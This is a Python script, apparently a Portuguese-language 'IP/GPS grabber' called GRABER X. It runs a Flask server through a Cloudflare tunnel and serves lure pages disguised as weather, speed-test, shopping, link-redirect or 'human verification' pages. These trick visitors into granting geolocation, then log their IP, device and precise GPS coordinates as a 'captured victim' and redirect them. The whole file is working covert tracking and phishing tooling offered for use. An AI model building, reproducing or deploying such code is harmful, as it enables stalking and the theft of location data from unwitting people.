import os, sys, json, base64, time, subprocess, threading, re, random
from flask import Flask, request, render_template_string

# Tenta importar Rich para a interface moderna, se não tiver, instala
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.layout import Layout
    from rich.live import Live
    from rich.align import Align
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.live import Live
    from rich.align import Align

console = Console()

# --- CONFIGURACOES (MANTIDAS) ---
LOG_FILE = "logs_graber_x.txt"
MY_TIKTOK = "https://www.tiktok.com/@archmodel57.wha?_r=1&_t=ZS-94uzsz9ny6x"

BANNER_TEXT = """
  ██████╗ ██████╗  █████╗ ██████╗ ███████╗██████╗ 
 ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
 ██║  ███╗██████╔╝███████║██████╔╝█████╗  ██████╔╝
 ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══╝  ██╔══██╗
 ╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗██║  ██║
  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
"""

def clear(): 
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    grid = Table.grid(expand=True)
    grid.add_column(justify="center")
    grid.add_row(f"[bold red]{BANNER_TEXT}[/bold red]")
    grid.add_row(f"[bold white]v12.7 | By: Anonymous40443[/bold white]")
    console.print(Panel(grid, border_style="red", padding=(1, 1)))

def final_exit():
    clear()
    console.print(Panel("[bold yellow]⚠ GRABER X DESLIGADO[/bold yellow]", border_style="red", expand=False))
    console.print(f"[bold cyan]Siga no TikTok:[/bold cyan] [underline]{MY_TIKTOK}[/underline]")
    time.sleep(2)
    sys.exit()

# --- LÓGICA DE BACKEND (INTACTA) ---

def get_short_url(url):
    try:
        import requests
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=10)
        return res.text.strip() if res.status_code == 200 else url
    except: return url

def get_device_info(ua):
    ua = ua.lower()
    if "iphone" in ua or "ipad" in ua: return "iPhone / iPad (iOS)"
    elif "android" in ua:
        brands = {"samsung": "Samsung", "sm-": "Samsung", "pixel": "Google Pixel", "huawei": "Huawei", "xiaomi": "Xiaomi", "redmi": "Xiaomi", "oppo": "OPPO", "vivo": "Vivo", "oneplus": "OnePlus", "motorola": "Motorola"}
        for key, brand in brands.items():
            if key in ua: return f"{brand} (Android)"
        return "Android (Celular)"
    elif "windows" in ua: return "Windows PC / Laptop"
    return "Dispositivo Desconhecido"

app = Flask(__name__)

HTML_BASE = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{ title }}</title><style>body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
.card { border: 1px solid #30363d; padding: 50px 30px; display: inline-block; border-radius: 12px; background: #161b22; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
button { background: #238636; color: white; border: none; padding: 14px 28px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
button:hover { background: #2ea043; }</style>
</head><body><div class="card"><div style="font-size:60px;margin-bottom:20px;">{{ icon }}</div>
<h2>{{ header }}</h2><p>{{ msg }}</p><button onclick="getLoc()">{{ btn }}</button></div>
<script>
function send(lat, lon, acc) { fetch('/capture', { method: 'POST', headers: {'Content-Type': 'application/json'}, 
body: JSON.stringify({lat: lat, lon: lon, acc: acc, ua: navigator.userAgent}) }).then(() => { window.location.href = "{{ dest }}"; }); }
function getLoc() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition((p) => { send(p.coords.latitude, p.coords.longitude, p.coords.accuracy); }, 
(e) => { send("NEGADO", "NEGADO", "0"); }, {enableHighAccuracy: true}); } else { send("NÃO SUPORTADO", "NÃO SUPORTADO", "0"); } }
</script></body></html>
"""

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = d.get('ua', '')
    dev = get_device_info(ua)
    lat = d.get('lat', 'N/A')
    lon = d.get('lon', 'N/A')
    maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat not in ["NEGADO", "N/A"] else "N/A"

    log_panel = Table.grid(expand=True)
    log_panel.add_row(f"[bold red]🔥 VITIMA CAPTURADA![/bold red]")
    log_panel.add_row(f"[bold white]🌐 IP      :[/bold white] [cyan]{ip}[/cyan]")
    log_panel.add_row(f"[bold white]📱 APARELHO:[/bold white] [green]{dev}[/green]")
    log_panel.add_row(f"[bold white]📍 GPS     :[/bold white] [yellow]{lat}, {lon}[/yellow]")
    console.print(Panel(log_panel, border_style="bold red", title="ALERTA DE CAPTURA"))

    log = (f"\n{'═'*50}\n"
           f"[🔥] VITIMA CAPTURADA!\n"
           f"📅 DATA     : {time.ctime()}\n"
           f"🌐 IP       : {ip}\n"
           f"📱 APARELHO : {dev}\n"
           f"📍 GPS      : {lat}, {lon}\n"
           f"🗺️ MAPS     : {maps_link}\n"
           f"{'═'*50}\n")
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log + "\n")
    return "OK"

@app.route('/')
def index():
    t = request.args.get('t', '4')
    dest = request.args.get('to') or MY_TIKTOK
    iscas = {
        '1': {"icon": "☁️", "title": "Clima", "header": "Previsão Local", "msg": "Ative o GPS para receber a previsão precisa.", "btn": "Ver Previsão"},
        '2': {"icon": "📶", "title": "Speed", "header": "SpeedTest", "msg": "Inicie o teste de velocidade da sua região.", "btn": "Iniciar Teste"},
        '3': {"icon": "🛍️", "title": "Ofertas", "header": "Lojas Próximas", "msg": "Veja promoções exclusivas perto de você.", "btn": "Ver Ofertas"},
        '4': {"icon": "🔗", "title": "Link", "header": "Acessar Link Encurtado", "msg": "Aceite a localização para prosseguir ao destino.", "btn": "Acessar Agora"},
        '5': {"icon": "🔒", "title": "Verificação", "header": "Verificação de Segurança", "msg": "Confirme que você é humano validando seu local.", "btn": "Verificar"}
    }
    return render_template_string(HTML_BASE, **iscas.get(t, iscas['4']), dest=dest)

def monitor_cloudflare(isca, dest_url):
    console.print("\n[bold yellow][*] AGUARDANDO LINK DO CLOUDFLARE (10-20s)...[/bold yellow]")
    while True:
        if os.path.exists("cf_log.txt"):
            try:
                with open("cf_log.txt", "r", encoding="utf-8", errors="ignore") as f:
                    log_data = f.read()
                link = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", log_data)
                if link:
                    raw_url = f"{link.group(0)}/?t={isca}&to={dest_url}"
                    short = get_short_url(raw_url)
                    
                    res_table = Table(show_header=False, border_style="green")
                    res_table.add_row("[bold green]URL GERADA:[/bold green]", raw_url)
                    res_table.add_row("[bold cyan]ENCURTADA :[/bold cyan]", f"[bold white]{short}[/bold white]")
                    console.print(Panel(res_table, title="LINKS PRONTOS", border_style="green"))
                    console.print("\n[bold blink red][!] AGUARDANDO CAPTURAS... (Ctrl+C para parar)[/bold blink red]")
                    break
            except: pass
        time.sleep(1.5)

def menu():
    while True:
        clear()
        show_banner()
        
        table = Table(show_header=False, border_style="red", expand=True)
        table.add_column("Opção", style="bold cyan", justify="right")
        table.add_column("Descrição", style="white")
        
        table.add_row("1", "IP GRABER (GERAR LINK)")
        table.add_row("2", "ABRIR MEU TIKTOK")
        table.add_row("3", "VER LOGS DE CAPTURA")
        table.add_row("4", "SAIR DO PROGRAMA")
        
        console.print(table)
        op = Prompt.ask("\n[bold red]SELECIONE[/bold red]", choices=["1", "2", "3", "4"])

        if op == '1':
            dest = console.input("\n[bold white]URL DE DESTINO (Enter p/ TikTok): [/bold white]") or MY_TIKTOK
            
            isca_menu = Table(title="MODELOS DE ISCA", border_style="yellow")
            isca_menu.add_column("ID", style="bold")
            isca_menu.add_column("Tipo")
            isca_menu.add_row("1", "Clima Local")
            isca_menu.add_row("2", "Speed Test")
            isca_menu.add_row("3", "Lojas Próximas")
            isca_menu.add_row("4", "Link Encurtado (Recomendado)")
            isca_menu.add_row("5", "Verificação de Segurança")
            console.print(isca_menu)
            
            isca = Prompt.ask("Escolha a isca", choices=["1", "2", "3", "4", "5"], default="4")

            console.print("\n[bold cyan][*] Iniciando servidores...[/bold cyan]")
            threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, threaded=True), daemon=True).start()
            
            with open("cf_log.txt", "w", encoding="utf-8") as f:
                subprocess.Popen(["cloudflared", "tunnel", "--no-autoupdate", "--protocol", "http2", "--url", "http://localhost:5000"],
                                 stdout=f, stderr=f)

            monitor_cloudflare(isca, dest)
            input("\nPressione ENTER para voltar ao menu...")

        elif op == '2':
            c = "termux-open" if os.path.exists("/data/data/com.termux") else "start" if os.name == 'nt' else "xdg-open"
            os.system(f"{c} {MY_TIKTOK}")

        elif op == '3':
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r", encoding="utf-8") as f:
                    console.print(Panel(f.read(), title="LOGS DE ACESSO", border_style="blue"))
            else:
                console.print("[yellow]Nenhum log encontrado.[/yellow]")
            input("\nENTER PARA VOLTAR...")

        elif op == '4':
            final_exit()

if __name__ == '__main__':
    try:
        menu()
    except KeyboardInterrupt:
        final_exit()
